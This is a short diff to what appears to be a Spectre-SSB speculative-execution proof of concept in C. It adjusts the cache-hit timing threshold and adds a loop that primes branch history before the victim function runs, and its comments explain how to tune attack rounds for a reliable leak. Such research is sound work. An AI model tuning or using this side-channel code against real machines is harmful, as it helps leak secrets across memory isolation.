@@ -25,7 +25,7 @@
 // Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
 #define ATTACK_ROUNDS 9 // used to be 3, 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
 // For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
-#define CACHE_HIT_THRESHOLD 34 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
+#define CACHE_HIT_THRESHOLD 37 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
 // To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.
 
 /* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
@@ -166,6 +166,12 @@ void main(){
 			// Make sure array you read from is not in the cache.
 //			flushCache(tempStringIndex, sizeof(tempStringIndex));
 			flushCache((uint32_t)probeArray, sizeof(probeArray));
+
+				/* Delay (act as mfence, memory fence) */
+				// Set of constant takens to make the BHR be in a all taken state.
+				for(volatile int k = 0; k < ARRAY_SIZE_FACTOR; k++){
+					asm("");
+				}
 
 			victimFuncInit(attackIdx);
 			switch (len) {
